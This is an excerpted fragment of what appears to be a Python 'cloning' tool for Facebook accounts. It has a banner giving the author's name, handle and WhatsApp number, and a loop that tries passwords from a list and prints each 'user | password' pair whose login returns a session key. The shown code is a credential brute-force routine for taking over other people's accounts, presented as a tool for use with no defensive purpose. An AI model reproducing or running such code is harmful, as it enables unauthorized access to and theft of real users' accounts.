...
def ____banner____():
	...
	print(f" {M}╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝")
	print(f"{Z}╔══════════════════════════════════════════╗")
	print(f"{Z}║{H}  OWNER    : {W}ARSALN x ARSALAN KHAN       {Z}║")
	print(f"{Z}║{H}  [=] FACEBOOK : {W}ARSALAN-TOOL                {Z}║")
	print(f"{Z}║{H}  [=] WHATSAP  : {W}03202271931             {Z}║")
	print(f"{Z}║{H}  FEATURE  : {W}OLD CLONING                 {Z}║")
	print(f"{Z}║{H}  [=] VERSION  : {W}v13.5                   {Z}║")
	print(f"{Z}╚══════════════════════════════════════════╝")
	print("")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result_json:
				...
				if yug == '':
					yug = 'Unknown'
				print(f'\r\033[1;32m [AHB-OK] {user} | {pw} | {yug}\033[0;97m')
